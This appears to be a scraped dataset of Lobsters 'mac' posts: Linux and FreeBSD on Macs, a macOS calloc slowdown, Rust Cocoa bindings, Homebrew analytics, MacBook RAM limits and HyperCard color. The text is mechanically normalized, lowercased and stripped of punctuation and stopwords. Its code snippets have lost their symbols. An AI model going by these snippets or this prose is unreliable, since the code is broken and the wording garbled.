herculean task reverseengineering macos driver writing basic linux driver resulting patch went initially supported two chip cactus ridge falcon ridge year able broaden support chip thunderbolt controller consume even idle apple provides nonstandard acpibased mechanism power controller nothing plugged implemented patch year make use linux first preparatory series avoid gratuitously waking controller system sleep second preparatory series queued add runtime power management pcie hotplug port third series containing actual runtime power management thunderbolt controller slated patch improve battery life noticeably idle power consumption macbook pro drop powering thunderbolt discrete gpu airport already disabled macos achieves support power management device firewire another upcoming feature efi device property thunderbolt controller posse unique id allows telling apart connected together id stored device rom vendor supposed burn factory curiously apple skipped step thunderbolt chip left device rom blank id controller get unique id turn efi driver generates device rom id based mac serial number communicates macos driver device property linux submitted patch retrieve property use device rom supplied efi thunderbolt driver kernel need booted efi stub work property contain lot device rom eg convey pci tunnel established thunderbolt efi driver graphic efi driver configured gpus see sample generated kernel command line option dumpappleproperties apple seems using proprietary protocol efi device property ever since moved took ten year linux catch nevertheless data available put u much better position support mac optimally current work focus coping surprise removal fixing system sleeprelated bug pcie hotplug driver many thunderbolt feature still needed support daisychaining establishing displayportoverthunderbolt tunnel networking another area need work specifically need driver mac hardware thunderbolt marketed total bandwidth gbit reality capped gbit pcie interface currently available controller still promise rival ethernet infiniband lower price point macbook pro introduced october four thunderbolt port would enable interesting application like portable compute cluster five fullymeshed node macos introduced ethernetoverthunderbolt tunneling intel ported closedsource window driver year later apparently due demand vendor dell intel also developed linux driver whose source code surprisingly made public year ninth iteration however released code mostly contains plumbing kernel networking subsystem firmwarebased icm real action happens firmware remains closed source dependency icm mean patch work nonmacs even intel driver duplicate portion noever driver asked eliminate duplicate code move remainder existing thunderbolt driver intel responded somewhat tightlipped manner maintain develop publish thunderbolt software code running apple hardware sound like came straight legal department avoid stepping toe key account cupertino obviously source code better source code greg kroahhartman reluctant merge additional driver pushed review firmware quirk efi firmware mac contains network stack facilitate downloading macos recovery image apple particularly egregious bug present efi driver broadcom wireless chip built various mac fails disable card upon exitbootservices call result card cause interrupt storm corrupts memory dma transfer received packet principle used remote code execution air garrett discovered issue sought fix grub quirk addressed memory corruption interrupt storm user continued see message irq nobody cared linux submitted early quirk reset wireless card finally fix issue good also picked supported stable kernel macbook pro introduced suffer similarly annoying issue caused unused pcie root port apple forgot disable firmware root port invisible macos enumerated acpi table linux discovers initializes thereby breaking suspend power machine chen yu posted workaround patch yet mainline already included distribution ubuntu spi input device nvme mobile mac used usb connect keyboard trackpad newer model equipped force touch trackpad moved custom controller connects southbridge spi first model macbook pro early controller alternatively support usb switchable two interface way acpi method usb mode model supported mainline kernel following machine notably macbook leave usb pin unconnected spi federico lorenzi begun reverseengineering controller protocol developing experimental outoftree driver macbook also custom nvme controller known come system sleep apparently due missing vendorspecific command conclusion user wishing try linux dual boot option alongside macos may want consider zfs allows crossmounting two operating system stable manner linux filesystems btrfs unfortunately well supported macos viceversa hf plus linux support journaling support experimental kernel developer need however aware loading zfs module disables lockdep due cddl taint bringup mac challenge bright side making huge leap every new release supporting new hardware generally take two year anything older expected work decently battery life yet par macos thunderbolt lack many feature gpu switching work preretinas despite limitation mac hardware support significantly ahead linux compared free operating system quote apple classic commercial youtube video crazy one bringing linux mac log post comment
485,Lobsters,mac,Apple macOS,Jean-Louis Gassée on the evolution of macOS and iOS,http://www.loopinsight.com/2016/12/05/jean-louis-gassee-on-the-evolution-of-macos-and-ios/,jeanlouis gassée evolution macos io,,jeanlouis gassée monday note mac software engine included appletalk network stack laserwriter driver ran single motorola cpu needed rom ramand today macos fullygrown computer operating system pleasant fast flexible also enormous ram disk storage requirement measured gigabyte exactly bugfree exapple acquaintance recently told something like open bug ongoing basis number urgent course fraction gamut like mature operating system macos become battlefield patch upon patch upon patchand apple smartphone project started key decision choice software engine apple try make lite version o x known go completely new direction note jeanlouis founder ceo inc appears new direction may tempting time apple smartphone project began apple employee former engineer offered palm inc beos code dump code support royalty engineer highly respected skill mating software unfamiliar hardware beos small light operating system draw palm purchased year turned learned asked become chairman palmsource palm software spinoff wow heard bit beforei could go excerpt really read piece terrific writing someone lived intersection apple history
486,Lobsters,mac,Apple macOS,Debugging Your Operating System: A Lesson In Memory Allocation,https://lukasa.co.uk/2016/12/Debugging_Your_Operating_System/,debugging operating system lesson memory allocation,hacker news decision censor call political content accept discomfort come confronting possible harm world order ensure leave world better found model view culture risk rise fascism bug report real bug memory actively zeroed mallocs callocs vmallocs oh let go calloc virtual memory back bug go source diving apple open source webpage abstraction leaky radar edit,edit hello hacker news good see want take away fun reading post digging memory management joy finding every little mistake made feel obliged remind great focus technical esoterica get really fun write software vacuum addition seeking technical content educates edifies hope also strongly encourage seek writing educates challenge political topic software developer uniquely privileged forefront revolutionising society next decade incumbent upon u informed nuanced role work play society whole end encourage challenge hacker news decision censor call political content understand moderating content difficult believe need accept discomfort come confronting possible harm world order ensure leave world better found part encourage consider whether ethical obligation involved building best world whether involves actively engaging disagree please also consider supporting publication produce longform work provides alternative valuable viewpoint need starting point consider model view culture local best source investigative journalism also strongly recommend consider whether risk rise fascism europe united state requires action part ensure employer community contribute repeat horror mid twentieth century lighthearted reminder way return regularly scheduled content enjoy post began many investigation bug report name bug report simple enough itercontent slow large chunk size http connection kind name bug report immediately fire alarm bell head two reason firstly remarkably difficult quantify slow mean slow large large secondly kind thing seems like effect severe heard itercontent method long time surely meaningfully slower reasonably common use mode heard quickly leaping initial report original reporter provides relatively little detail say cause cpu slows throughput le catch eye seems like possibly true idea merely downloading data minimal processing could slow surely however bug deserve investigation ruled backandforth original poster got reproduction scenario used request pyopenssl ran following code pin cpu find data throughput dropped extremely minimal amount import request http requestsget http streamtrue content httpsitercontent pas great repro scenario point finger clearly request stack usersupplied code running code shipped part request library one dependency risk user wrote wacky lowperformance code really fantastic even fantastic repro scenario us public url mean run reproduced bug every time one bit tantalising detail noticeable increase cpu load impact throughput cpu load like throughput reduced compared really interesting data point implies literal value chunk size affecting work load combine information fact occurs pyopenssl fact stack spends time following line code problem becomes clear file line recv buf ffinew char bufsiz investigation determined cffi default behaviour ffinew return zeroed memory meant linear overhead allocation size bigger allocation spend time zeroing data hence bad behaviour large allocation used cffi feature disable zeroing memory buffer problem went away problem solved right wrong real bug joking aside genuinely resolve problem however day later nathaniel smith asked insightful question memory actively zeroed understand question need digress bit memory allocation posix system mallocs callocs vmallocs oh many programmer familiar standard way ask operating system memory mechanism using c standard library function malloc read documentation system typing man malloc manual page function take single argument number byte allocate memory c standard library use one many different strategy allocating memory one way another return pointer bit memory least large amount memory asked standard malloc return uninitialized memory mean c standard library locates memory immediately pass program without changing already mean standard use malloc return buffer program program already written data behaviour common source nasty bug language memoryunsafe like c general reading uninitialized memory extremely dangerous pattern however malloc friend documented right alongside manual page calloc calloc obvious difference malloc take two argument count size malloc ask c standard library please allocate least n byte whereas call calloc ask c standard library please allocate enough memory n object size byte clear original intent calloc allocate heap memory array object safe way calloc extra side effect related original purpose allocate array mentioned quietly manual page allocated memory filled byte value zero go handinhand calloc original purpose example allocating array value often helpful array begin default state modern memorysafe language actually adopted default behaviour building array structure example go programming language initialize structure member defaulted socalled zero value basically equivalent value would everything set zero thought promise go structure allocated using calloc behaviour mean malloc return uninitialized memory calloc return initialized memory strict promise operating system optimise indeed modern operating system optimised let go calloc course simplest way implement calloc write like void calloc sizet count sizet size assert multiplicationwouldoverflow count size sizet allocationsize count size void allocation malloc allocationsize memset allocation allocationsize return allocation cost function like clearly approximately linear size allocation setting byte zero clearly going become increasingly expensive byte fact operating system ship c standard library optimised path memset usually taking advantage specialised cpu vector instruction zero lot byte instruction nevertheless cost linear operating system another trick sleeve larger allocation take advantage virtual memory trick virtual memory fully explaining virtual memory going beyond scope blog post unfortunately highly recommend read interesting stuff however short version virtual memory operating system kernel lie process memory process running machine view memory belongs alone view memory mapped onto physical memory indirectly allows operating system perform kind clever trickery one common form clever trickery bit memory actually file used swapping memory disk also used memorymapping file case memory mapping file program ask operating system please allocate n byte memory back bit memory file disk write memory writes written file disk read memory read come file disk way work kernel level process try read memory cpu notice memory process reading actually exist pause process emit page fault operating system kernel invoked act bring data memory application read original process unpaused find perspective time passed magically byte file present memory location mechanism used perform neat trick one make large memory allocation free properly make expensive proportion much memory used rather proportion much memory allocated reason historically many program needed decent chunk memory lifetime would startup allocate massive buffer byte could parcel internally program lifetime done program written environment use virtual memory needed call dibs certain amount memory avoid getting starved virtual memory policy longer needed program allocate much memory need ondemand longer starve help avoid application large startup cost operating system started lie large allocation operating system attempt allocate kilobyte one call c standard library ask operating system directly brandnew virtual memory page cover many byte key cost almost nothing operating system actually allocate commit memory point set virtual memory mapping make operation extremely cheap time malloc call course memory mapped process moment application try actually use memory page fault occur point operating system find actual page memory put place much like page fault memorymapped file except virtual memory backed physical memory instead file net result modern operating system call malloc allocate one gigabyte memory happen almost immediately actually nothing done truly give process memory result program allocates many gigabyte memory never actually us execute quite quickly long allocation quite large potentially surprising optimisation made calloc work operating system map brand new page socalled zero page page memory readonly read entirely zero mapping initially copyonwrite mean process eventually try write brand new memory map kernel intervene copy zero new page apply write o trick calloc larger allocation simply malloc ask brandnew virtual memory page continues cost memory actually used neat optimisation mean calloc cost exactly malloc size despite calloc additional promise zeroing memory neat back bug nathaniel pointed cffi using calloc would memory zeroed part one course always use calloc suspicion bumped case could reproduce slowdown directly calloc went back coded quick repro program came include stdlibh define allocationsize int main int argc char argv int void temp calloc allocationsize free temp return simple c program allocates free memory using calloc ten thousand time exit two likely possibility might happen calloc may use virtual memory trick described case expect program fast indeed memory allocate never actually get used never get paged page never get dirtied o little trick lying u allocating memory never call o bluff everything work beautifully calloc may use malloc zero memory manually using memset expect slow total need zero one terabyte memory ten thousand increment mb take quite lot effort well standard o threshold using behaviour expect behaviour indeed linux exactly see compile gcc run find executes quickly indeed cause page fault exerts little memory pressure take program run macos find take extremely long time testing took nearly eight minute even weirdly make allocationsize bigger say suddenly macos program becomes almost instantaneous hell happening go source diving macos contains neat utility called sample see man sample tell quite lot running process sampling process state sample output program looked like sampling process second millisecond run time sample sampling completed processing symbol sample analysis process written file analysis sampling aout pid every millisecond process aout path userscorytmpaout load address identifier aout version code type parent process zsh datetime launch time o version mac o x report version analysis tool usrbinsample call graph comapplemainthread serial start libdylddylib main aout calloc libsystemmallocdylib malloczonecalloc libsystemmallocdylib szonemallocshouldclear libsystemmallocdylib largemalloc libsystemmallocdylib platformbzero variant haswel libsystemplatformdylib largemalloc libsystemmallocdylib madvise libsystemkerneldylib main aout freelarge libsystemmallocdylib madvise libsystemkerneldylib freelarge libsystemmallocdylib madvise libsystemkerneldylib main aout total number stack recursive counted multiple sort top stack collapsed platformbzero variant haswell libsystemplatformdylib madvise libsystemkerneldylib key note clearly see spending bulk time platformbzero variant haswell method used zero buffer mean macos zeroing buffer well handily apple opensources much core operating system code sometime release see program spends time libsystemmalloc simply went apple open source webpage downloaded tarball contains relevant source code went spelunking turn magic happens largemalloc branch used allocation larger ultimately use virtual memory trick really slow execution well turn apple got bit clever good largemalloc contains whole bunch code hidden behind define constant configlargecache whole bunch code basically amount freelist large memory page allocated program macos program allocates contiguous buffer memory largecachesizeentrylimit approximately libsystemmalloc attempt reuse page another allocation made could use save needing ask darwin kernel memory page save context switch syscall nontrivial saving principle however calloc naturally case need byte zeroed reason macos find page reused called calloc zero memory every time totally unreasonable zeroed page legitimately limited resource especially resource constrained hardware looking apple watch mean possible reuse page potentially really major saving however page cache totally destroys optimisation using calloc provide zeroed memory page bad done dirty page page zeroing written application likely zeroed macos unconditionally mean call calloc free calloc without ever touching memory second call calloc take page allocated first one never backed actual memory force o page memory order zero even though already zeroed part trying avoid virtualmemory based allocator large allocation memory ever used becomes used freelist net effect macos calloc cost linear allocation size way despite fact operating system get behaviour mb macos stop caching page sudden everything get speedy great really unexpected bug find python program raise number question example many cpu cycle wasted zeroing memory already zeroed many context switch wasted forcing application pagein memory never used need o could unnecessarily zero ultimately though think show truth old adage abstraction leaky python programmer mean able forget somewhere depth running machine built memory trickery someday program going really unexpectedly slow way find dive way operating system work silly thing memory bug filed radar handsdown one weirdest bug ever encountered edit previous version post talked operating system kernel zeroing page idle time really way work modern os instead copyonwrite version zeropage used another neat optimisation allows kernel avoid spending lot time writing zero used page instead write zero application actually writes data page effect saving even cpu cycle application asks memory literally never touch never cost anything fill zero neat
487,Lobsters,mac,Apple macOS,nvpy 1.0.0 has been released!,https://cpbotha.net/2016/12/02/nvpy-1-0-0-has-been-released/,nvpy released,released version nvpy automattic always need,oh happy day last night released version nvpy â crossplatform linux mac window simplenotesyncing notetaking app nvpy also popular open source baby least github star fork screenshot nvpy demo database note since first released nvpy automattic released official open source desktopâ app simplenote although official app prettier electronbased nvpy faster us fraction ram r v r furthermore syncing deterministic see exactly syncs personally use nvpy linux mac workstation laptop official simplenote apps androidâ device textonly note always need currently planning write new sqlitebased storage backend nvpy greatly speed interactive notesearching
488,Lobsters,mac,Apple macOS,Building native macOS applications with Rust,http://blog.bugsnag.com/building-macos-apps-with-rust/,building native macos application rust,rust robust library ecosystem getting started cocoa crate objc block cocoa crate appkit wrapping cocoa apis macro drop packaging rust app example conclusion class cluster number objectivec class hand github,rust system programming language focused speed safe concurrency using personal project heavily since release last year project replacement existing script workflow new command line tool buti wanted create mac application determine would benefit memory efficiency safety robust library done io mac application development many year worth noting hardest part cocoa development always learning framework rather language experiment applying cocoa rust knowledge create something safe yet easy work withgetting started cocoa cratesthere already crate working objectivec runtime objc block crate using runtime directly interfacing block extension respectively objc crate particular provides msgsend macro basic interface messaging objectivec object example creating annsobject unsafe let cl class get nsobject unwrap let obj mut object msgsend cl new cocoa crate build provide interface using framework including appkit drawing window view onscreen also interesting take implementing objectivec class translates trait implemented genericnsobject type snippet creates app window present screen unsafe let pool nsautoreleasepool new nil let app nsapp appsetactivationpolicy nsapplicationactivationpolicyregular let window nswindow alloc nil initwithcontentrectstylemaskbackingdefer nsrect new nspoint new nssize new nstitledwindowmask nsuinteger nsbackingstorebuffered autorelease let title nsstring alloc nil initstr hello world windowsettitle title windowmakekeyandorderfront nil apprun pretty cool though entire interface unsafe missing hopeful goal experiment approach could still interesting writing application core code rust packaging using cocoa bindingswrapping cocoa apis caveat create rust wrapper objectivec class course trial error base trait use wrapping interacting objectivec object use objc runtime object pub type id mut object pub trait objcclass sized return pointer underlying objc object fn ptr self id creates instance objc object pointer failing pointer instance wrapped class fn fromptr ptr id option self printed name class fn classname static str typesafe reference instance nil pointer fn nil self performs iskindofclass check whether particular pointer instance wrapped class fn ptrisclass ptr id bool change instance one class another failing pointer instance preferred class useful converting inherited class eg nsdictionary nsmutabledictionary fn coerce objcclass self option fromptr selfptr designate instance suitable released scope fn autorelease self self drop objectivec reference object invalid fn release mut self note creates rust object reference objectivec object overall effect minimal interaction still happens objectivec runtime landusing trait easily done creating handy macro named implobjcclass wrapping average class became easy example wrap method nsstringconst nsuinteger implobjcclass nsstring impl nsstring creates nsstring str pub fn content str self let ptr mut object unsafe let string mut object msgsend class nsstring alloc msgsend string initwithbytes contentasptr length contentlen encoding nsstring ptr ptr length string measured code point pub fn len self usize unsafe msgsend selfptr lengthofbytesusingencoding class used directly without unsafe let greeting nsstring hello asserteq greetinglen resource still need released autoreleased applicable longer needed class became much easier use explored option implementing drop trait automatically discard objectivec object rust reference go scope behavior always desirable especially working reference application window expected stay life time application least longer current scopepackaging rust appwhile use snippet cocoa crate run executable executable packaged app bundle would suitable app icon putting app dock registered default application like mail client used mailto link example need package executable app bundlean easy way create app bundle launch rust code create acocoa app rust dependent app target requires step inxcode create new app using cocoa app template add second build target application creates rust binary add second target default app target dependency add rust executable bundled resource app target replace default appdelegate script launch rust binary something like bit swift let task process tasklaunchpath bundlemainpath forresource myrustprogram oftype nil tasklaunch taskwaituntilexit created example show part action add app icon pipe output rust executable system consoleconclusionsthe initial result le ergonomic using existing cocoa crate since interface add additional safety perhaps removed generic object type conformed every cocoa class trait could call wrong method cocoa class instanceswriting layer class top objc improved latter though initial overhead write wrapper using class still felt clumsy converting value class cluster example potential crate interfacing withobjectivec generator make ergonomic method name despite mapped number objectivec class hand stylistic choice probably suitable general use library rustcocoa became fast use iterate idea approach could worth try reusable component rust share acocoa application construct unsuitable use foreign function could cover experience like declare objectivec class rust implementing protocol topic later made longer example demonstrating snippet post well general template usable packaging mac app available githubthanks reading
489,Lobsters,mac,Apple macOS,Brew commands send data to Google Analytics,https://tobiastom.name/notes/7a79eed0,brew command send data google analytics,analyticsmd every time execute command optout update technical decision made ok,thing know accept especially implicitly asked analyticsmd homebrew begun gathering anonymous aggregate user behaviour analytics reporting google analytics fair continue notified first time run brew update install homebrew see notification everyone else asked see either nobody aware fact data send google every time execute command brew see definitely optin feature instead optout starting wonder else behind scene access almost update post follow lead developer contacted twitter please read one well technical decision made ok
490,Lobsters,mac,Apple macOS,FreeBSD on a MacBook Pro,https://gist.github.com/mpasternacki/974e29d1e3865e940c53,freebsd macbook pro,freebsd macbook pro jetpack terminology material macbook pro late act preparing dual boot luckily somebody already figured one http refind act ii installation described wiki,freebsd macbook pro since work apple hardware o back grew tired linux desktop going massive next year least since switched something work six year later le le work started turning spyware nagware nt need much le maintenance linux desktop least work system administration software development probably better mythical end user person work needed get software need running le obscure work need linux othe unixlike system finding turning away gui program used appreciate time use osx run terminal firefox emacs gui used nice unintrusive got annoying either came full circle last year computer usage osx experience degraded last year sysadmindeveloper kind power user perspective power user whose definition fun includes spending hour middle night figuring get dual boot working uefi next reason working lot freebsd software jetpack visible want try custom kernel option vimage racct using custom kernel seems tricky vmwarevirtualbox vm skipping vm overhead would nice final push saw terminology demo ran old laptop already got freebsd installed found working advertised xxist century graphical terminal realized display picture want want integrated mutt irssi switching yet ongoing experiment see much get running challenge take hardware developed osx particular without much thought given operating system designed make interoperability easy get open o running see much tradeoff want try running open operating system safely expect software wo nt insist phoning home syncing data cloud wo nt nag enable feature require choose skip also practical side hardware nt plan get new workstation soon surely miss thing first start xorg already cringe font rendering maybe configurable somewhere though libreoffice good replacement m officeiwork probably nt match keynote sure document viewer nowadays apple preview nice invisible omnigraffle flux time machine integrated address book ibooks dash handy documentation browser paper couple game probably hard time figuring use closed software need work fan flash player skype google still list nt seem big long apple hardware keep dual boot wo nt hurt try worst case learn something new go back osx material asked hardware exactly macbook pro late ram optical drive exchanged second hard drive attached apple thunderbolt display another reason get new hardware wireless bluetooth apple keyboard touchpad hope get working least basic level installing freebsd snapshot newer one already got mine already installed even managed update buildworldinstallworld act preparing dual boot first need disk space already trickier expected delete stuff make space also timeconsuming plan use main hard disk freebsd leave rest osx deleting moving enough junk bumped first obstacle resizing system volume osx nt smart enough resize running partition something entirely unexpected also smart enough provide meaningful error message push progress bar hour two fail could nt unmount disk message thing booted rescue mode loaded hidden partition disk located right main osx system partition macintosh hd shrink recovery partition relocated luckily somebody already figured one made installer sd card installer still disk since osx upgrade described http started disk utility installer able successfully shrink partition need boot manager seems refind way go first booted sd card see start installed disk finding get configuration needed later obvious though need start disk utility select efi partition system disk mount boot manager mounted volumesefi act ii installation downloaded installer image read probably already recent one dded sd card booted refind booting card mbr legacy boot nt work rescanned pressing esc boot menu selected rescue partition card apparently meant card efi partition installer managed boot installer boot fine important thing loader get moment ca nt read zfs yet boot need ufs partition found seems work zfsenabled underway get tried achieve old linux way boot separate partition mounted zfs root could nt get work kernel booted nt able mount root directory end used following scheme ufs partition end disk system root big enough hold base system couple kernel plus margin large zfs partition root dir mounted tank wanted zfs partition located ufs root able shrink osx partition movegrow zfs later bunch symlinks nt let installer touch zfs partition create boot partition tried add end installation selected open shell new system button nt remember exact label created zpool mounted tank created usr var filesystems described wiki plus usrdoc copied whole existing home var subdirectory usr replaced main filesystem home var usr doc port src obj local symlinks tank filesystems way system partition wo nt grow much get zfs benefit able boot system efi also added zfsenable yes new system etcrcconf booting new system manually zfs import zpool everything worked fine finishing installation copy installer new system file someplace safe going need finishing installation wo nt see bsd refind boot menu problem boot osx mount volumesefi disk utility create volumesefiefifreebsd directory put file trick unmount efi volume reboot see freebsd boot menu boot fine probably need run zfs import tank first boot besides everything work fine base system installing package pkg work x window kind work still quite far comfortable optimal setup working right also need disk volume data want share osx freebsd trying decide exfat zfs openzfs osx mac side post find one work fine
491,Lobsters,mac,Apple macOS,MacOS 10.12 Open Source,https://opensource.apple.com/release/os-x-1012.html,macos open source,,
493,Lobsters,mac,Apple macOS,Doom on the MacBook Pro Touch Bar,https://www.youtube.com/watch?v=GD0L46y3IqI,doom macbook pro touch bar,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature doom macbook pro touch bar youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature doom macbook pro touch bar youtube
494,Lobsters,mac,Apple macOS,Why the MacBook Pro is limited to 16GB of RAM,https://macdaddy.io/macbook-pro-limited-16gb-ram/,macbook pro limited ram,phil schiller intel chipset used istats menu almost negligible http http ram background power draw http bigger hit ceiling imposed federal aviation administration ram standby power draw http sometimes even kill source information support attempted analysis comparison laptop support ram last article topic dell xps http lenovo thinkpad http http http page reviewbody lenovo thinkpad processor personal opinion mac data recovery recently rendered music video hd style app http update update phil schiller comment article point two inaccuracy,much fanfare macbook pro released much disillusionment biggest limitation became clear ram ceiling model community reaction strong enough elicit response phil schiller put fast ram notebook design time would require memory system consumes much power efficient enough notebook hope check new generation macbook pro really incredible system give good indication reasoning let dig deeper intel chipset used support following kind ram ram low power ram lpddr ram however go megahertz speed apple us ram possible yet another ram standard known e enhanced ram go memory type restricted supported intel cpu another low voltage ram type standard finished yet desktop class memory plainly spoken would option wanted go past question would much power really saving using memory memory could used supported cpu short rough answer normal condition ram us watt using memory would use watt would overall system power usage use ram v bit le overall power usage lpddr seen placing system normal load using excellent istats menu see exactly many amp ram currently using using simple calculation get wattage drawn ram case using amp volt watt power draw since done testing unit ram since macbook pro us need rely testing people pc world first important note despite claim contrary difference power draw almost negligible note power consumption ddr v lpddr ram decrease peak power significant though w w decrease quite bit http power consumption difference system equipped lowvoltage regular memory w idle mode w load http even though article making point little difference lpdrr memory make making comparison comparing much higher powered setup case comparing desktop class machine using lpddr v ddr raw number important use case raw number show ddr memory us watt lpddr memory impossible get exact figure depending usage estimated watt saved using ram instead since system average drawing watt battery normal usage said difference ram using watt versus watt translated overall power usage would make difference power dedicated ram versus would ram background power draw important mention conservative estimate taking account something difficult calculate real world usage ram used lot energy wasted time take go back sleep mode result background power draw lead overall decrease efficiency tend show power performance test estimated overall power draw average system using ram contrast overall power draw using background energy big contributor overall energy due lack fast power mode offset io energy saving http pdf considering watthour battery used inch machine could made battery bigger hit ceiling imposed federal aviation administration still battery life using lpddr memory ram standby power draw lddpr ram us le energy computer sleeping ddr ram folk micron manufacture memory made thorough analysis published detailed pdf conclusion following equation illustrates mobile dram device use pmms consumes average nearly five time power compared device use pmms preceding example indicates power calculated particular mobile ddr sdram device specific system operating condition power consumption given mobile dram device vary greatly depending system access memory standard operating mode pmm feature used pmm powerful power saving feature several significant power saving feature lpddr another favorite computer sleep memory use consolidated physical chip possible others completely powered considering lpddr memory made mobile device normal ddr ram made device plugged surprising initially sound decrease power usage lpddr ram v ddr ram sleeping notebook source http page apple using lpddr several generation notebook part way get long standby time switching would drastically decrease day standby time get le one week produced notebook would completely drained battery charge closed lid left day would annoying running battery flat often would end damaging percentage battery frequently get discharged put lot stress sometimes even kill source information apple scale even people suffer issue becomes suffixed gate indicate scandal massive scale apple get huge number upset customer intel decided support seems clear apple would used iphone use memory since us apple custom arm cpu support linustechtips attempted analysis extra power would required support ram unfortunately fatal flaw compare making result mistaken surprising usually high quality information source comparison laptop support ram last article topic mentioned faa ceiling would prevented apple including ram maintaining decent battery life even wanted quite backlash claim must easily supportable laptop support went laptop support memory greater found would expect aside paytoplay review suffer big restriction term battery life dell xps disappointing part xps battery life garnered hour minute video playback battery far cry dell advertised battery life hour http battery life result pulled dell xps expected battery eater test xps potent graphic cpu processing engine display lot keep powered inside light pound frame result flatout stress test spin cooling fan audible level shortly peter hour half however turn workload simple video playback xps able manage almost hour uptime bad bit tweaking certainly model nontouch display could likely eke lot depending workload http lenovo thinkpad http review mention epic battery life however look spec machine specification reviewed gb v dimm slot three empty gb maximum official ram high spec everything else occupying dimm slot using ram chip decrease available bandwidth ram order conserve battery life using stick instead standard unlike mobile workstation thinkpad last full day charge lenovo laptop endured full hour minute laptop mag battery test involves continuous web surfing wifi nit brightness http continuous web surfing without even switching application mimic realworld usage pro laptop ram would inactive duration test fully recharging laptop set machine powersave mode opposed balanced highperformance mode make batteryconserving tweak preparation unplugged video rundown test test loop locally stored file containing full lord ring screen brightness set percent volume percent system conk screen famous sucking battery power keep thinkpad heavier lenovo chose battery compared hefty battery battery zbook show test result played video little five hour going hibernation terrible dell disappoint anyone hoping full workday away ac outlet http page reviewbody lenovo thinkpad lenovo thinkpad physically speaking apple apple comparison also light thin machine ram decent battery life account however dig deeper come weak processor processor core typically mobile processor used serious pro laptop comparison valid personal opinion apple used make inch macbook pro discontinued sell well enough personally inch would always powerful machine could get hand even weighed kilo cost would still buy recognize target market overall market spoken wallet term sale volume thinner lighter notebook steered apple path show exactly mean term personal need besides usual work mac data recovery software recently rendered music video hd using neural net called style app due ram limitation took several day wrote terabyte drive swap space yes gigabyte would order magnitude faster system ram apple never made big compromise engineering switch memory support would relatively absurd given disadvantage outlined article would likely replace intel cpu inhouse manufactured arm cpu order support wait spec get completed would make practical anchor text link directly part article http update update phil schiller comment article point two inaccuracy phil schiller senior vice president marketing apple made couple point regard article error detail macbook pro us ram stated top article omission article would support require usage desktop class memory come issue described would also require different logic board design full text message hi ben thanks asking article nice entirely accurate macbook pro us fast lpddr memory support memory would require using ddr memory low power also require different design logic board might reduce space battery factor would reduce battery life phil sent iphone thanks phil schiller taking time point thing
495,Lobsters,mac,Apple macOS,How HyperCard got its color back…,http://orangejuiceliberationfront.com/how-hypercard-got-its-color-back/,hypercard got color,black white native color support colorizing hypercard addcolor incolor animation hypercard released hypercard macos ever color hypercard,many people heard hypercard offline precursor modern web mac equivalent visual basic tool first wiki myst made sometimes also called first widelyused implementation hyperlink though really get easytouse text link support series even complicated link used today many people also heard hypercard never got proper color support wait myst fullcolor game even played movie one wrong always matter nuance platform ingenious hack black white hypercard came bill atkinson intentionally chose crisp bw bitmapped window size pixel best time meant everyone even people small mac plusclassic screen would able view able trade stack friend important part social experience hypercard atkinson invented clever lossless image compression scheme known among hypercard reverseengineerers reduced bw picture practical size variety trick including runlengthencoding xoring row previous row meant even checkerboard pattern compressed one line dot xored repeatedly black row format reengineered slightly card could arbitrary size long width still multiple native color support separate team apple tasked port hypercard back apple iigs home computer blank slate start integrated support native color able choose apple color palette specifying color number also added feature would later make back original like radio button group macintosh hypercard still color support worse syntax introduced apple ii color file format really suitable mac iigs limited color set pixel taller wide colorizing hypercard hypercard made way hand applesubsidiary claris engineer eric carlson anup murarka came ingenious hack bring color hypercard without change file format even touch engine code hypercard used doublebuffered display whenever redraw part window first painted individual part onto hidden copied buffer window screen meant never got effect seen many drawing program last copying step achieved using system call named copybits replaced system call routine hypercard plugin could check whether destination copied current window mix drawing since hypercard used black outline white used drawing mode draw color top bw picture black would stay black darkest color white area would color overlay course third merging step fast hardware time worked fairly well decided release hack due concern support load would generate two engineer quickly replaced claris logo logo got permission release free thirdparty extension addcolor incolor heizer software large distributor popular hypercard plugins created color overlay plugin named incolor feature like color transition effect myst made eventually hypercard proper followed suit first shipped prerelease use hypercard color tool stack included included addcolor xcmd used approach colorizehc instead script picture drawing wanted card wrote list item color resource id number card background provided incolorstyle transition effect stack also implemented editor interface provided color tool palette allowed select button field simply clicking color even drew selection top selected item fashion dissimilar editor hypercard clone like supercard worked although separate xfcn named used intercept mouse click card draw marching ant able set edge object apart button field could also add colored rectangle pict file resource color overlay addcolor included hypercard even got pict editor window color paint tool animation hypercard animation support usually restricted changing pixel icon later arbitrarilysized picts using id plus button trick flipping card given slow color overlay performed mac time really option fluid animation color hypercard bundled addmotion ii unlike color tool product motionworks created editor top hypercard providing macrominddirectorstyle timeline interface pixel graphic editor animation generated completely separate hypercard saved stack could use xcmd play one inside card window covering card returning hypercard released hypercard macos ever color nope basically every hypercard version added new command hypercard exception could made hypercard added new button type popup button nativelooking button visible feature core engine support osa scripting language like applescript instead hypertalk color nope screen shot courtesy hypercard used permission
496,Lobsters,mac,Apple macOS,Switching to Ubuntu (from Apple),http://support.system76.com/articles/switch/,switching ubuntu apple,ubuntu apple gnome shell running managing program desktop environment installing software gnome software workspace window management workspace finding program file dash spotlight file management cloud storage dropbox meganz google drive boxcom watching video vlc codecs networking web browsing firefox safari emailing thunderbird lightning thunderbird conversation gcontactsync evolution communicating friendscoworkers skype slack google hangout hip chat pidgin working image gimp darktable inkscape adobe document editing libre office open office microsoft managing music spotify pandora google music rhythmbox apple itunes clementine audacity mixxx ardour playing game steam installing steam writing software atom sublime apache virtual machine working terminal brew apt,coming ubuntu apple little confusing everything software name task need different software generally operating system accomplish function running program managing file installing software watching funny cat video sending email lowlevel function networking keyboard input displaying image ubuntu included software ubuntu default desktop environment gnome shell handle need additional software installed desktop environment changed make experience quite different go common operating system task show located gnome shell running managing program gnome shell default launcher left side screen gnome shell launcher handle program nearly identical apple dock run program click run program launcher search rightclick program keep launcher see program open look arrow around icon gnome desktop environment changed easily please see article change desktop environment desktop environment installing software ubuntu come full featured gnome software search new software game program application computer workspace window management ubuntu workspace dynamically created mean created needed workspace switched window moved workspace finding program file ubuntu dash much like apple spotlight search press super key graphical software file searched easily file management file manager largely file manager start standard set shortcut additional shortcut added dragging folder left panel way file shown customizable operating system ubuntu application folder contains shortcut gui application computer navigate usrshareapplications drag folder left panel list currently installed program readily available cloud storage dropbox meganz currently desktop integration ubuntu google drive boxcom currently four major cloud storage solution accessed web browser ubuntu watching video open source video player vlc 